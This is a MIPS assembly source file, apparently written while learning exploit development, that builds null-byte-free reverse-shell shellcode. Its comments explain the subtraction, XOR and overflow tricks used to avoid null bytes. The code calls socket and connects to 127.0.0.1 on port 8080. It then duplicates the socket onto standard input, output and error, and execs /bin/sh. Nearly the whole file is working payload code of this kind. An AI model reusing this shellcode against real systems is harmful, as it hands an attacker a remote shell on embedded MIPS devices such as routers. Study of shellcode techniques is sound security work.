.globl main
.text
# MIPS assembly works in destination, source commands 

main:
#Subtraction Technique
# Loading -6 into $t1 gives the hex value of fffa, then nor-ing the value sets it to a decimal value of 5
# in the function, addiu-ing with a negative number will set the register to the desired 
# nubmer without adding a null byte

li $t1, -6			
nor $t1, $zero

#XOR Technique
# Choosing a random high byte (0x2121 here) and using a reversible XOR on a value yields 
# the desired value without any null bytes
li $t2, 0x2121

#Addition Overflow Technique
# When adding adding a value to 7f7f to get 10000, MIPS is 32 bit only and overflows 
# the 1 leaving just a 0, must use addiu, u = unsigned and therefore will not raise
# an exception when overflown
li $t3, 0x7f7f

# socket(2, 2, 0) = sock_fd
# Load all the params into registers and intialize the syscall
addiu $a0, $t1, -3	# Ultimately puts 2 into the $a0 register
addiu $a1, $t1, -3
addiu $a2, $t1, -5
li $v0, 0x1057
syscall 0x40404
addiu $s0, $v0, 0x1010

# connect(3, {2, htons(0x1f90), inet_addr(0x7f000001)}, 16) 
addiu $a0, $s0, -0x1010
xori $t0, $t2, 0x2123
sh $t0, -20($sp) #sh (store) commands use source, destination 
li $t0, 0x901F
sh $t0, -18($sp)
xori $t0, $t2, 0x215E
sh $t0, -16($sp)
xori $t0, $t2, 0x2021
sh $t0, -14($sp)
addiu $a1, $sp, -20
xori $a2, $t2, 0x2131 
li $v0, 0x104A
.byte 0x0c, 0x01, 0x01, 0x01

# dup2(3, 0)
addiu $a0, $s0, -0x1010
addiu $a1, $t3, 0x8081 
li $v0, 0xFDF
syscall 0x40404

# dup2(3, 1)
addiu $a0, $s0, -0x1010
addiu $a1, $t3, 0x8082
li $v0, 0xFDF
syscall 0x40404


# dup2(3, 2)
addiu $a0, $s0, -0x1010
addiu $a1, $t3, 0x8083
li $v0, 0xFDF
syscall 0x40404

# execve("/bin/sh", ["/bin/sh"], NULL)
# "/"   "b"  "i" "n"  "/"  "s"  "h"
# 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
lui $t0, 0x6e69
addiu $t0, 0x622f
sw $t0, -20($sp)
lui $t0, 0x6868
addiu $t0, 0x732f
sw $t0, -16($sp)
sb $zero, -13($sp)	# Dropping a null byte directly on the stack, still 
			# confused on why 13 exactly

addiu $a0, $sp, -20
sw $a0, -8($sp)
sw $zero, -4($sp)
addiu $a1, $sp, -8
slti $a2, $zero, -1	# SLTI (set if less than immediate), checks if $zero is 
			# less than -1, if is then sets $a2 to 1 if not, sets to 0
li $v0, 0xFAB
syscall 0x40404

# Website = https://syscalls.w3challs.com/?arch=mips_o32
